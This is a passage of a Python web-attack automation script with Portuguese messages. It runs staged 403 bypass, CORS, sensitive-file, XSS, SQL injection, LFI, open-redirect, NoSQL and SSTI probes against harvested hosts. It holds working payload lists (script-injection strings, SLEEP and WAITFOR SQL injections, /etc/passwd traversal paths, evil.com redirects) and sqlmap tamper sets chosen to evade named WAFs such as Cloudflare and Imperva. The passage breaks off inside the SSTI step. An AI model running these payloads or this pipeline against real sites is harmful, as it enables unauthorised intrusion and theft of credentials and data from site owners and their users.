        info("Nenhuma URL 403/401 para bypass"); return
    log(f"Tentando bypass em {len(urls_403)} URLs com 403/401...")

    bypass_headers = [
        {'X-Forwarded-For': '127.0.0.1'},
        {'X-Forwarded-For': '::1'},
        {'X-Real-IP': '127.0.0.1'},
        {'X-Original-URL': '/'},
        {'X-Custom-IP-Authorization': '127.0.0.1'},
        {'X-Forwarded-Host': 'localhost'},
        {'X-Host': 'localhost'},
        {'X-Remote-IP': '127.0.0.1'},
        {'X-Remote-Addr': '127.0.0.1'},
        {'X-Originating-IP': '127.0.0.1'},
    ]

    def try_bypass(url):
        base = url.rstrip('/')
        path = '/' + base.split('/',3)[-1] if '/' in base.split('//',1)[-1] else '/'
        results = []

        # Header-based bypass
        for hdrs in bypass_headers:
            st, _ = retry_curl(url, extra_headers=hdrs)
            if st == 200:
                results.append(f"[403→200 HEADER BYPASS] {url}\n  → Headers: {hdrs}")

        # URL manipulation bypass
        url_variants = [
            f"{base}//",
            f"{base}%2f",
            f"{base}?anything",
            f"{base}#",
            f"{base}..;/",
            f"{base}/..",
            f"{base}/%2e",
            base.replace('https://', 'https://') + '/./',
        ]
        for variant in url_variants:
            try:
                st, _ = retry_curl(variant)
                if st == 200:
                    results.append(f"[403→200 URL BYPASS] {url}\n  → Variant: {variant}")
                    break
            except Exception:
                pass
            curl_throttle()

        with _log_lock:
            for r in results:
                append_line(out_file, r)
                warn(f"403 BYPASS: {r.split(chr(10))[0]}")

    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
        list(ex.map(try_bypass, urls_403))

    n = count_lines(out_file)
    if n > 0:
        warn(f"403 Bypass bem-sucedido: {n} URLs")
    else:
        info("Nenhum bypass 403 encontrado")


# ─────────────────────────────────────────────────────────────────────────────
# STEP 12 — CORS
# ─────────────────────────────────────────────────────────────────────────────
def step_cors():
    section("12 / CORS MISCONFIGURATION CHECK")
    cors_file = f"{cfg.dir_extra}/cors_vuln.txt"
    Path(cors_file).touch()
    targets = read_head(f"{cfg.dir_disc}/alive.txt", cfg.limit_cors)
    log(f"Testando CORS em {len(targets)} hosts...")

    def check_cors(url):
        try:
            r = subprocess.run(
                ['curl','-sk','--max-time',str(cfg.timeout),'-A',random_ua(),
                 '-H','Origin: https://evil.com',
                 '-H','Access-Control-Request-Method: GET','-I',url],
                capture_output=True, text=True, timeout=cfg.timeout+5, errors='replace'
            )
            resp = r.stdout.lower()
            acao_m = re.search(r'access-control-allow-origin:\s*(.+)', resp)
            acac_m = re.search(r'access-control-allow-credentials:\s*(.+)', resp)
            acao = acao_m.group(1).strip() if acao_m else ""
            acac = acac_m.group(1).strip() if acac_m else ""
            if 'evil.com' in acao:
                with _log_lock:
                    sev = "[CORS CRÍTICO]" if 'true' in acac else "[CORS INFO]"
                    append_line(cors_file, f"{sev} {url} → ACAO: {acao} | Credentials: {acac}")
            elif '*' in acao:
                with _log_lock:
                    append_line(cors_file, f"[CORS WILDCARD] {url}")
        except subprocess.TimeoutExpired:
            log_err(f"check_cors timeout: {url}")
        except (OSError, subprocess.SubprocessError) as e:
            log_err(f"check_cors error {url}: {e}")

    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as ex:
        list(ex.map(check_cors, targets))
    found = count_lines(cors_file)
    if found > 0:
        success(f"CORS issues: {found}")
    else:
        info("CORS: nenhuma misconfiguração")


# ─────────────────────────────────────────────────────────────────────────────
# STEP 13 — SECURITY HEADERS
# ─────────────────────────────────────────────────────────────────────────────
def step_headers():
    section("13 / SECURITY HEADERS CHECK")
    out = f"{cfg.dir_extra}/headers_issues.txt"
    Path(out).touch()
    targets = read_head(f"{cfg.dir_disc}/alive.txt", cfg.limit_headers)
    log(f"Verificando headers em {len(targets)} hosts...")

    checks = [
        ('strict-transport-security', 'Missing-HSTS'),
        ('content-security-policy',   'Missing-CSP'),
        ('x-frame-options',           'Missing-X-Frame-Options'),
        ('x-content-type-options',    'Missing-X-Content-Type-Options'),
        ('referrer-policy',           'Missing-Referrer-Policy'),
        ('permissions-policy',        'Missing-Permissions-Policy'),
        ('x-xss-protection',          'X-XSS-Protection (deprecated)'),
    ]

    def check_headers(url):
        try:
            r = subprocess.run(['curl','-sk','--max-time',str(cfg.timeout),'-I',url],
                               capture_output=True, text=True, timeout=cfg.timeout+5, errors='replace')
            hdrs = r.stdout.lower()
            issues = [label for header, label in checks if header not in hdrs]
            # Extra: server version disclosure
            sv = re.search(r'server:\s*(.+)', hdrs)
            if sv and re.search(r'[\d.]', sv.group(1)):
                issues.append(f"Server-Version-Disclosure: {sv.group(1).strip()[:50]}")
            if issues:
                with _log_lock:
                    append_line(out, f"{url}: {', '.join(issues)}")
        except subprocess.TimeoutExpired:
            log_err(f"check_headers timeout: {url}")
        except (OSError, subprocess.SubprocessError) as e:
            log_err(f"check_headers error {url}: {e}")

    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as ex:
        list(ex.map(check_headers, targets))
    success(f"Headers analisados: {count_lines(out)} hosts com issues")


# ─────────────────────────────────────────────────────────────────────────────
# STEP 14 — SENSITIVE FILES
# ─────────────────────────────────────────────────────────────────────────────
def step_sensitive():
    section("14 / ARQUIVOS SENSÍVEIS")
    sensitive_endpoints = [
        '.git/config','.git/HEAD','.env','.env.local','.env.production',
        'config.php','config.yml','config.yaml','config.json','settings.py',
        'wp-config.php','database.yml','secrets.yml','credentials',
        '.htpasswd','.htaccess','backup.sql','dump.sql','db.sql',
        'robots.txt','sitemap.xml','crossdomain.xml','phpinfo.php',
        'info.php','test.php','server-status','server-info',
        'api/swagger','swagger.json','openapi.json','api-docs',
        'actuator','actuator/env','actuator/health','actuator/mappings',
        '.DS_Store','Thumbs.db','web.config','app.config',
    ]
    out = f"{cfg.dir_extra}/sensitive_files.txt"
    Path(out).touch()
    hosts = read_head(f"{cfg.dir_disc}/alive.txt", cfg.limit_sensitive)
    test_urls = [f"{h.rstrip('/')}/{ep}" for h in hosts for ep in sensitive_endpoints]
    log(f"Verificando {len(test_urls)} URLs sensíveis...")

    def check_sensitive(url):
        try:
            r = subprocess.run(
                ['curl','-sk','--max-time',str(cfg.timeout),'-o','/dev/null','-w','%{http_code}',url],
                capture_output=True, text=True, timeout=cfg.timeout+5
            )
            status = r.stdout.strip()
            if status == '200':
                with _log_lock:
                    append_line(out, f"[200] {url}")
                    feedback_hook('sensitive', url, 200)
            elif status in ('301','302','403'):
                with _log_lock:
                    append_line(out, f"[{status}] {url}")
        except subprocess.TimeoutExpired:
            log_err(f"check_sensitive timeout: {url}")
        except (OSError, subprocess.SubprocessError) as e:
            log_err(f"check_sensitive error {url}: {e}")

    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as ex:
        list(ex.map(check_sensitive, test_urls))
    found = len([l for l in safe_read(out) if l.startswith('[200]')])
    if found > 0:
        success(f"Arquivos sensíveis (200): {found}")
    else:
        info("Nenhum arquivo sensível acessível")


# ─────────────────────────────────────────────────────────────────────────────
# STEP 14b — METADATA HARVESTING (v3 — NOVO)
# ─────────────────────────────────────────────────────────────────────────────
def step_metadata():
    section("14b / METADATA HARVESTING (exiftool)")
    if not cfg.has_exiftool:
        warn("exiftool não encontrado — instale: sudo apt install exiftool"); return
    out_file = f"{cfg.dir_extra}/metadata.txt"
    Path(out_file).touch()

    # Find document URLs
    all_urls = safe_read(f"{cfg.dir_urls}/urls_all.txt")
    doc_urls = [u for u in all_urls
                if re.search(r'\.(pdf|doc|docx|xls|xlsx|ppt|pptx|odt|ods)(\?|$)', u, re.I)]
    doc_urls = doc_urls[:cfg.limit_metadata]
    if not doc_urls:
        info("Nenhum documento para análise de metadata"); return
    log(f"Baixando e analisando {len(doc_urls)} documentos com exiftool...")

    tmp_dir = tempfile.mkdtemp(prefix="meta_")
    for url in doc_urls:
        ext = re.search(r'\.(pdf|docx?|xlsx?|pptx?)(\?|$)', url, re.I)
        ext = (ext.group(1) if ext else 'bin').lower()
        fname = f"{abs(hash(url)) % 1000000:08x}.{ext}"
        fpath = os.path.join(tmp_dir, fname)
        try:
            subprocess.run(['curl','-sk','--max-time','30','-L','-o',fpath,url],
                           timeout=35, capture_output=True)
            if os.path.exists(fpath) and os.path.getsize(fpath) > 100:
                r = subprocess.run(['exiftool','-json',fpath],
                                   capture_output=True, text=True, timeout=10)
                if r.stdout:
                    try:
                        meta = json.loads(r.stdout)[0]
                        interesting = {k: v for k, v in meta.items()
                                       if k in ['Author','Creator','LastModifiedBy','Company',
                                                'Producer','Software','Title','Subject',
                                                'Description','Keywords','Manager']}
                        if interesting:
                            append_line(out_file, f"[DOC] {url}")
                            for k, v in interesting.items():
                                append_line(out_file, f"  → {k}: {str(v)[:100]}")
                            warn(f"Metadata: {url} → {list(interesting.keys())}")
                    except Exception:
                        pass
        except Exception:
            pass
        curl_throttle()

    shutil.rmtree(tmp_dir, ignore_errors=True)
    n = count_lines(out_file)
    if n > 0:
        success(f"Metadata encontrado em {n} linhas")
    else:
        info("Nenhum metadata relevante extraído")


# ─────────────────────────────────────────────────────────────────────────────
# STEP 15 — XSS SCAN (v3: BUGFIX HANG + deadline por URL + feedback loop)
# ─────────────────────────────────────────────────────────────────────────────
def step_xss():
    section("15 / XSS SCAN")
    for fn in ['xss_manual.txt','xss_headers.txt','xss_dom.txt','dalfox.txt']:
        Path(f"{cfg.dir_scans}/{fn}").touch()

    xss_targets_all = sorted(set(
        safe_read(f"{cfg.dir_vulns}/xss.txt") +
        [u for u in safe_read(f"{cfg.dir_params}/params_alive.txt") if '?' in u and '=' in u]
    ))
    # v6: deduplicação por assinatura — evita testar page.php?id=1 e page.php?id=2 separado
    xss_targets_all = deduplicate_by_signature(xss_targets_all)
    all_targets_file = f"{cfg.dir_scans}/xss_all_targets.txt"
    with open(all_targets_file,'w') as f:
        f.write('\n'.join(xss_targets_all)+'\n')
    if not xss_targets_all:
        warn("Nenhum candidato XSS — pulando"); return

    total = len(xss_targets_all)
    log(f"Total XSS targets: {total}")

    xss_payloads = [
        '<script>alert(xss1)</script>',
        '"><script>alert(xss2)</script>',
        '"><img src=x onerror=alert(xss3)>',
        '<svg onload=alert(xss4)>',
        '"><svg onload=alert(xss5)>',
        '"-alert(xss6)-"',
        '{{xss7}}',
    ]

    manual_out = f"{cfg.dir_scans}/xss_manual.txt"
    limit = min(total, cfg.limit_xss_manual)

    # ── 15a: Manual XSS — V3 BUGFIX: deadline por URL ─────────
    log(f"15a) Manual XSS pre-check em {limit} URLs (deadline={cfg.xss_url_deadline}s/URL)...")

    def test_xss_url_with_deadline(url: str):
        """Testa uma URL com deadline absoluto para não travar."""
        deadline = time.time() + cfg.xss_url_deadline
        for payload in xss_payloads:
            if time.time() > deadline:
                log_err(f"XSS deadline atingido: {url}")
                return
            # Skip se payload similar já foi bloqueado (feedback loop)
            if is_blocked('xss', payload):
                continue
            active = mutate_xss(payload)
            encoded = url_encode(active)
            for test_url in inject_per_param(url, encoded):
                if time.time() > deadline:
                    return
                try:
                    # Timeout agressivo por request
                    r = subprocess.run(
                        _build_curl_cmd(test_url),
                        capture_output=True, text=True,
                        timeout=min(cfg.timeout, 8), errors='replace'
                    )
                    out = r.stdout
                    status_str = out.rsplit('__S__', 1)[-1].replace('__','').strip() if '__S__' in out else '0'
                    body = out.rsplit('\n__S__', 1)[0] if '__S__' in out else out
                    status = int(status_str) if status_str.isdigit() else 0
                    feedback_hook('xss', payload, status)
                    if active in body or active.lower() in body.lower():
                        with _log_lock:
                            append_line(manual_out, f"[XSS REFLECTED] {test_url}")
                            append_line(manual_out, f"  → Payload: {active}")
                            warn(f"XSS Refletido: {test_url}")
                        if cfg.sqlite_db:
                            db_save_vuln('xss_reflected', test_url, active, 'high')
                        if cfg.webhook_url:
                            send_webhook("XSS Refletido", f"URL: {test_url}\nPayload: {active}", severity="high")
                        return
                except subprocess.TimeoutExpired:
                    log_err(f"XSS request timeout: {test_url}")
                    return
                except Exception:
                    pass
                jitter()

    # ThreadPoolExecutor com timeout global para o bloco inteiro
    global_deadline = time.time() + (cfg.xss_url_deadline * limit) + 60
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
        futures = {ex.submit(test_xss_url_with_deadline, url): url
                   for url in xss_targets_all[:limit]}
        for fut in concurrent.futures.as_completed(futures, timeout=cfg.xss_url_deadline * limit + 60):
            if time.time() > global_deadline:
                warn("XSS: deadline global atingido — avançando")
                ex.shutdown(wait=False, cancel_futures=True)
                break
            try:
                fut.result(timeout=cfg.xss_url_deadline + 5)
            except concurrent.futures.TimeoutError:
                url = futures.get(fut, '?')
                log_err(f"XSS future timeout: {url}")
            except Exception:
                pass
    info(f"15a) XSS manual: {count_lines(manual_out)} suspeitos")

    # ── 15b: XSS via headers ──────────────────────────────────
    log(f"15b) XSS via headers em {cfg.limit_waf} hosts...")
    hdr_payload = mutate_xss('"><script>alert(xss_header)</script>')
    hdr_out = f"{cfg.dir_scans}/xss_headers.txt"
    for url in read_head(f"{cfg.dir_disc}/alive.txt", cfg.limit_waf):
        ua = random_ua()
        for hdr_name, hdrs in [
            ('User-Agent', {'User-Agent': hdr_payload}),
            ('Referer',    {'User-Agent': ua, 'Referer': hdr_payload}),
            ('X-Fwd-For',  {'User-Agent': ua, 'X-Forwarded-For': hdr_payload}),
        ]:
            try:
                _, resp = retry_curl(url, extra_headers=hdrs)
                if hdr_payload in resp:
                    append_line(hdr_out, f"[XSS HEADER:{hdr_name}] {url}")
                    warn(f"XSS via header {hdr_name}: {url}")
            except Exception:
                pass
        jitter()
    info(f"15b) XSS headers: {count_lines(hdr_out)} suspeitos")

    # ── 15c: DOM-based XSS ───────────────────────────────────
    log("15c) DOM XSS — análise de sinks JS...")
    dom_sinks   = [r'document\.write\s*\(',r'innerHTML\s*=',r'outerHTML\s*=',
                   r'insertAdjacentHTML',r'eval\s*\(',r'location\.href\s*=',
                   r'location\.replace\s*\(',r'\.src\s*=']
    dom_sources = r'location\.(search|hash|href)|URLSearchParams|getParameterByName|window\.name'
    dom_out = f"{cfg.dir_scans}/xss_dom.txt"
    for jsurl in read_head(f"{cfg.dir_js}/js_files.txt", 30):
        _, content = cfetch(jsurl)
        if not content:
            curl_throttle(); continue
        if re.search(dom_sources, content, re.I):
            for sink in dom_sinks:
                if re.search(sink, content, re.I):
                    append_line(dom_out, f"[DOM XSS] {jsurl}")
                    append_line(dom_out, f"  → Sink: {sink}")
                    break
        curl_throttle()
    info(f"15c) DOM XSS: {count_lines(dom_out)} suspeitos")

    # ── 15d: Dalfox (v5 FIX: output direto ao disco) ────────
    dalfox_limit = min(total, 200)
    log(f"15d) Dalfox pipe em {dalfox_limit} URLs...")
    dalfox_input = '\n'.join(xss_targets_all[:dalfox_limit])
    dalfox_out = f"{cfg.dir_scans}/dalfox.txt"
    if circuit_breaker.allow("dalfox"):
        rc, _, _ = tool_runner.run(
            "dalfox",
            ['dalfox', 'pipe', '--silence', '--timeout', str(cfg.timeout),
             '--worker', str(cfg.max_dalfox_workers), '--user-agent', random_ua()],
            timeout=600,
            input_data=dalfox_input,
            write_to=dalfox_out
        )
        if rc < 0:
            circuit_breaker.record_failure("dalfox")
            warn("dalfox falhou — resultados parciais podem estar no arquivo")
        else:
            circuit_breaker.record_success("dalfox")
    n_df = count_lines(cfg.dir_scans+'/dalfox.txt')
    success(f"XSS — Dalfox: {n_df} | Manual: {count_lines(manual_out)} | "
            f"DOM: {count_lines(dom_out)} | Header: {count_lines(hdr_out)}")


# ─────────────────────────────────────────────────────────────────────────────
# STEP 16 — SQLi SCAN
# ─────────────────────────────────────────────────────────────────────────────
def step_sqli():
    section("16 / SQLi SCAN")
    for fn in ['sqli_results.txt','sqli_error_based.txt','sqli_blind.txt',
               'sqli_confirmed.txt','sqli_post.txt','ghauri_results.txt','sqli_all_targets.txt']:
        Path(f"{cfg.dir_scans}/{fn}").touch()

    sqli_targets = sorted(set(
        safe_read(f"{cfg.dir_vulns}/sqli.txt") +
        [u for u in safe_read(f"{cfg.dir_params}/params_alive.txt") if '?' in u and '=' in u]
    ))
    # v6: deduplicação por assinatura — evita sqlmap em /item?id=1, /item?id=2, /item?id=3
    sqli_targets = deduplicate_by_signature(sqli_targets)
    with open(f"{cfg.dir_scans}/sqli_all_targets.txt",'w') as f:
        f.write('\n'.join(sqli_targets)+'\n')
    if not sqli_targets:
        warn("Nenhum candidato SQLi — pulando"); return
    limit = min(len(sqli_targets), cfg.max_sqli)
    log(f"SQLi targets: {len(sqli_targets)} → testando {limit}")

    tamper_arg = []
    if cfg.waf_detected and os.path.exists(f"{cfg.dir_extra}/waf_detected.txt"):
        waf_content = strip_ansi(open(f"{cfg.dir_extra}/waf_detected.txt").read()).lower()
        tampers = {
            'cloudflare':  'charencode,between,randomcase,space2comment,greatest',
            'modsecurity': 'space2comment,charencode,randomcase,between',
            'imperva':     'charencode,equaltolike,space2comment,randomcase,between',
            'akamai':      'between,charencode,space2comment,randomcase',
            'f5':          'charencode,space2comment,between,randomcase,versionedkeywords',
        }
        for wt, t in tampers.items():
            if wt in waf_content:
                tamper_arg = [f'--tamper={t}']; break
        if not tamper_arg:
            tamper_arg = ['--tamper=space2comment,between,charencode,randomcase']

    sql_error_sigs = [
        r'SQL syntax.*MySQL',r'Warning.*mysql_fetch',r'ORA-[0-9]{4}',
        r'Microsoft SQL Native Client',r'Unclosed quotation mark',r'SQLSTATE\[',
        r'Syntax error.*PostgreSQL',r'Incorrect syntax near',r'sqlite.*error',
        r'org\.postgresql',r'java\.sql\.SQLException',r'You have an error in your SQL',
        r'MySQLSyntaxErrorException',r'PDOException',r'ERROR 1064',r'PL/SQL',
        r'Warning.*mssql',r'Dynamic SQL Error',r'SQLiteException',
    ]

    # ── 16a: Error-based ──────────────────────────────────────
    log(f"16a) Error-based pre-check em {limit} targets...")
    sql_error_payloads = ["'","'--","\"--","') OR 1=1--","1 AND 1=2",
                          "1 UNION SELECT NULL,NULL--","1 ORDER BY 99--",
                          "1 AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
                          "admin'--","' OR 1=1--"]
    eb_out = f"{cfg.dir_scans}/sqli_error_based.txt"

    def test_sqli_error(url):
        # v5 FIX: obtém baseline da página normal para comparação de contexto (reduz FP)
        try:
            baseline_st, baseline_resp = cfetch(url)
        except (OSError, subprocess.SubprocessError):
            return
        baseline_len = len(baseline_resp)

        for payload in sql_error_payloads:
            if is_blocked('sqli', payload):
                continue
            active = mutate_sqli(payload)
            encoded = url_encode(active)
            for test_url in inject_per_param(url, encoded):
                try:
                    st, resp = cfetch(test_url)
                    feedback_hook('sqli', payload, st)
                    for sig in sql_error_sigs:
                        if re.search(sig, resp, re.I):
                            # v5: valida contexto — erro deve aparecer na página modificada
                            # e NÃO na baseline (evita FP em páginas que já exibem "SQL")
                            sig_in_baseline = bool(re.search(sig, baseline_resp, re.I))
                            len_diff = abs(len(resp) - baseline_len)
                            if sig_in_baseline and len_diff < 50:
                                # mesma assinatura na baseline e tamanho idêntico → FP
                                continue
                            with _log_lock:
                                append_line(eb_out, f"[ERROR-BASED SQLi] {test_url}")
                                append_line(eb_out, f"  → Sig: {sig} | Payload: {active} | baseline_had_sig={sig_in_baseline}")
                                warn(f"SQLi error-based: {test_url}")
                            if cfg.sqlite_db:
                                db_save_vuln('sqli_error_based', test_url, active, 'high')
                            if cfg.webhook_url:
                                send_webhook("SQLi Error-Based", f"URL: {test_url}\nPayload: {active}", severity="high")
                            return
                except subprocess.TimeoutExpired:
                    log_err(f"test_sqli_error timeout: {test_url}")
                except OSError as e:
                    log_err(f"test_sqli_error OS: {test_url}: {e}")
                jitter()

    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as ex:
        list(ex.map(test_sqli_error, sqli_targets[:limit]))

    # ── 16b: Blind time-based ─────────────────────────────────
    log("16b) Blind time-based SQLi...")
    blind_payloads = ["' AND SLEEP(4)--","\" AND SLEEP(4)--","1 AND SLEEP(4)--",
                      "'; WAITFOR DELAY '0:0:4'--","'; SELECT pg_sleep(4)--"]
    blind_out = f"{cfg.dir_scans}/sqli_blind.txt"
    for url in sqli_targets[:min(20, limit)]:
        try:
            baselines = []
            for _ in range(3):
                t0 = time.time()
                cfetch(url)
                baselines.append(time.time() - t0)
            baselines.sort()
            t_normal = baselines[1]
            for payload in blind_payloads:
                if is_blocked('sqli', payload):
                    continue
                encoded = url_encode(payload)
                for test_url in inject_per_param(url, encoded):
                    t0 = time.time()
                    try:
                        subprocess.run(
                            ['curl','-sk','--max-time',str(cfg.timeout+6),
                             '-o','/dev/null',test_url],
                            timeout=cfg.timeout+8, capture_output=True
                        )
                    except Exception:
                        pass
                    elapsed = time.time() - t0
                    if elapsed >= t_normal + 3:
                        append_line(blind_out, f"[BLIND SQLi] {test_url}")
                        append_line(blind_out, f"  → Payload: {payload} | T={elapsed:.1f}s (base={t_normal:.1f}s)")
                        warn(f"Blind SQLi: {test_url}")
                    curl_throttle()
        except Exception:
            pass

    # ── 16c: POST SQLi ────────────────────────────────────────
    post_payloads = ["' OR '1'='1'--","admin'--","1' AND SLEEP(3)--"]
    post_out = f"{cfg.dir_scans}/sqli_post.txt"
    post_targets = [u for u in read_head(f"{cfg.dir_params}/params_alive.txt", 15)
                    if re.search(r'(login|auth|signin|api|user)', u, re.I)]
    for url in post_targets:
        for payload in post_payloads:
            encoded_pl = url_encode(payload)
            json_body = json.dumps({'username': payload, 'password': payload})
            for ct, data in [
                ('application/json', json_body),
                ('application/x-www-form-urlencoded', f"username={encoded_pl}&password={encoded_pl}")
            ]:
                _, resp = retry_curl(url, method='POST',
                                     extra_headers={'Content-Type': ct}, data=data)
                for sig in sql_error_sigs:
                    if re.search(sig, resp, re.I):
                        append_line(post_out, f"[POST SQLi] {url} — Payload: {payload}")
                        break
            curl_throttle()

    # ── 16d: SQLMap ───────────────────────────────────────────
    sqli_dir = f"{cfg.dir_scans}/sqli_output"
    Path(sqli_dir).mkdir(exist_ok=True)
    log(f"16d) SQLMap em {limit} targets...")

    def run_sqlmap(url):
        if not circuit_breaker.allow("sqlmap"):
            return
        safe = f"{abs(hash(url)) % 1000000:08x}"
        out = f"{sqli_dir}/result_{safe}.txt"
        cmd = ['sqlmap', '-u', url, '--batch', '--level=3', '--risk=2',
               '--technique=BEUSTQ', '--random-agent', f'--timeout={cfg.timeout}',
               '--retries=1', '--forms', '--threads=3', f'--output-dir={sqli_dir}']
        cmd += tamper_arg
        rc, _, _ = tool_runner.run("sqlmap", cmd, timeout=300, write_to=out)
        if rc < 0:
            circuit_breaker.record_failure("sqlmap")
        else:
            circuit_breaker.record_success("sqlmap")

    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as ex:
        list(ex.map(run_sqlmap, sqli_targets[:limit]))

    all_results = []
    for rf in glob.glob(f"{sqli_dir}/result_*.txt"):
        all_results.extend(safe_read(rf))
    confirmed = [l for l in all_results if re.search(
        r'is vulnerable|Parameter.*injectable|sqlmap identified|Type: error|Type: UNION|Type: time|Type: boolean', l, re.I)]
    with open(f"{cfg.dir_scans}/sqli_confirmed.txt",'w') as f:
        f.write('\n'.join(confirmed)+'\n')
    with open(f"{cfg.dir_scans}/sqli_results.txt",'w') as f:
        f.write('\n'.join(all_results)+'\n')
    info(f"SQLi — Error: {count_lines(eb_out)} | Blind: {count_lines(blind_out)} | "
         f"POST: {count_lines(post_out)} | SQLMap: {len(confirmed)}")


# ─────────────────────────────────────────────────────────────────────────────
# STEP 17 — LFI
# ─────────────────────────────────────────────────────────────────────────────
def step_lfi():
    section("17 / LFI CHECK")
    out = f"{cfg.dir_scans}/lfi_results.txt"
    Path(out).touch()
    lfi_targets = read_head(f"{cfg.dir_vulns}/lfi.txt", cfg.limit_lfi)
    if not lfi_targets:
        warn("Nenhum candidato LFI"); return
    log(f"Testando LFI em {len(lfi_targets)} candidatos...")

    # Adaptar payloads pela tecnologia detectada
    payloads = ["../../../../etc/passwd","../../../etc/passwd","/etc/passwd",
                "..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%252F..%252Fetc%252Fpasswd",
                "php://filter/convert.base64-encode/resource=index",
                "file:///etc/passwd","/proc/self/environ",
                "../../../../windows/win.ini"]
    if cfg.tech_php:
        payloads += [
            "php://filter/convert.base64-encode/resource=config",
            "php://input","phar://","zip://",
            "data://text/plain;base64,dGVzdA==",
        ]
    if cfg.tech_java:
        payloads += [
            "../../../../WEB-INF/web.xml",
            "../../../../WEB-INF/classes/application.properties",
        ]

    def test_lfi(url):
        # v5 FIX: baseline para validação de contexto
        try:
            _, baseline_resp = cfetch(url)
        except (OSError, subprocess.SubprocessError):
            return

        for payload in payloads:
            if is_blocked('lfi', payload):
                continue
            encoded = url_encode(payload)
            for test_url in inject_per_param(url, encoded):
                try:
                    st, resp = cfetch(test_url)
                    feedback_hook('lfi', payload, st)
                    # v5: sinal LFI só conta se NÃO estava na baseline (evita FP em páginas de erro genéricas)
                    lfi_sigs = r'root:x:|bin:x:|daemon:x:|nobody:x:|nologin'
                    if re.search(lfi_sigs, resp) and not re.search(lfi_sigs, baseline_resp):
                        with _log_lock:
                            append_line(out, f"[LFI CONFIRMED] {test_url}")
                            append_line(out, f"  → Payload: {payload}")
                            warn(f"LFI CONFIRMADO: {test_url}")
                        if cfg.sqlite_db:
                            db_save_vuln('lfi', test_url, payload, 'critical')
                        if cfg.webhook_url:
                            send_webhook("LFI Confirmado", f"URL: {test_url}\nPayload: {payload}", severity="critical")
                        return
                    elif re.search(r'\[extensions\]|for 16-bit|\[fonts\]', resp):
                        with _log_lock:
                            append_line(out, f"[LFI CONFIRMED win.ini] {test_url}")
                            warn(f"LFI win.ini: {test_url}")
                        return
                    elif 'WEB-INF' in payload:
                        if re.search(r'<web-app|<servlet|<context-param', resp):
                            with _log_lock:
                                append_line(out, f"[LFI JAVA WEB-INF] {test_url}")
                                warn(f"LFI Java WEB-INF: {test_url}")
                            return
                    elif 'php://filter' in payload:
                        b64 = re.search(r'[A-Za-z0-9+/]{40,}={0,2}', resp.replace('\n',''))
                        if b64:
                            try:
                                decoded = base64.b64decode(b64.group()).decode(errors='replace')
                                if re.search(r'root:x:|<\?php', decoded):
                                    with _log_lock:
                                        append_line(out, f"[LFI php filter] {test_url}")
                                    return
                            except Exception:
                                pass
                except Exception:
                    pass
                curl_throttle()

    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as ex:
        list(ex.map(test_lfi, lfi_targets))
    success(f"LFI confirmados: {count_lines(out)}")


# ─────────────────────────────────────────────────────────────────────────────
# STEP 18 — OPEN REDIRECT
# ─────────────────────────────────────────────────────────────────────────────
def step_redirect():
    section("18 / OPEN REDIRECT CHECK")
    out = f"{cfg.dir_scans}/redirect_results.txt"
    Path(out).touch()
    targets = read_head(f"{cfg.dir_vulns}/redirect.txt", cfg.limit_redirect)
    if not targets:
        warn("Nenhum candidato redirect"); return

    payloads = ["https://evil.com","//evil.com","///evil.com","/\\evil.com",
                "https:evil.com","@evil.com","javascript:alert(1)"]

    def test_redirect(url):
        for payload in payloads:
            for test_url in inject_per_param(url, url_encode(payload)):
                try:
                    r = subprocess.run(
                        ['curl','-sk','--max-time',str(cfg.timeout),'-I',test_url],
                        capture_output=True, text=True, timeout=cfg.timeout+5
                    )
                    loc = re.search(r'^location:\s*(.+)', r.stdout, re.M|re.I)
                    if loc and re.search(r'evil\.com', loc.group(1), re.I):
                        with _log_lock:
                            append_line(out, f"[REDIRECT VULN] {test_url}")
                            append_line(out, f"  → Location: {loc.group(1).strip()}")
                            warn(f"Redirect: {test_url}")
                        return
                except Exception:
                    pass
                curl_throttle()

    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
        list(ex.map(test_redirect, targets))
    success(f"Open redirects: {count_lines(out)}")


# ─────────────────────────────────────────────────────────────────────────────
# STEP 18b — NoSQL
# ─────────────────────────────────────────────────────────────────────────────
def step_nosql():
    section("18b / NoSQL INJECTION")
    out = f"{cfg.dir_scans}/nosql_results.txt"
    Path(out).touch()
    targets = read_head(f"{cfg.dir_params}/params_alive.txt", 30)
    if not targets:
        warn("Sem parâmetros para NoSQL"); return

    nosql_get = ['[$gt]=', '[$ne]=0', '[$regex]=.*']
    nosql_post = [{'$ne': None}, {'$gt': ''}, {'$regex': '.*'}]

    for url in targets:
        for pl in nosql_get:
            test_url = re.sub(r'=[^&]*', pl, url)
            _, resp = cfetch(test_url)
            if re.search(r'(username|email|password|user|admin|data|results)', resp, re.I):
                append_line(out, f"[NoSQL GET] {test_url}")
                warn(f"NoSQL potencial (GET): {test_url}")
        for op in nosql_post:
            body = json.dumps({'username': op, 'password': op})
            _, resp = retry_curl(url, method='POST',
                                  extra_headers={'Content-Type':'application/json'}, data=body)
            if re.search(r'(token|session|logged|welcome|dashboard|success)', resp, re.I):
                append_line(out, f"[NoSQL POST] {url}")
                warn(f"NoSQL POST: {url}")
        curl_throttle()
    info(f"NoSQL findings: {count_lines(out)}")


# ─────────────────────────────────────────────────────────────────────────────
# STEP 18c — SSTI
# ─────────────────────────────────────────────────────────────────────────────
def step_ssti_active():
    section("18c / SSTI ACTIVE PROBE")
    out = f"{cfg.dir_scans}/ssti_results.txt"
    Path(out).touch()
    targets = read_head(f"{cfg.dir_vulns}/ssti.txt", 30)
    if not targets:
        warn("Nenhum candidato SSTI"); return

    ssti_tests = {
        '{{7*7}}':'49','${7*7}':'49','<%= 7*7 %>':'49',
        '#{7*7}':'49',"{{7*'7'}}":'7777777','{{"a".upper()}}':'A',
        '*{7*7}':'49',
    }
    # Adicionar testes específicos por tech
    if cfg.tech_java:
        ssti_tests['${7*7}'] = '49'
        ssti_tests['#{7*7}'] = '49'
    if cfg.tech_python or cfg.tech_ruby:
        ssti_tests['{{config}}'] = 'Config'

    for url in targets:
        for payload, expected in ssti_tests.items():
            encoded = url_encode(payload)
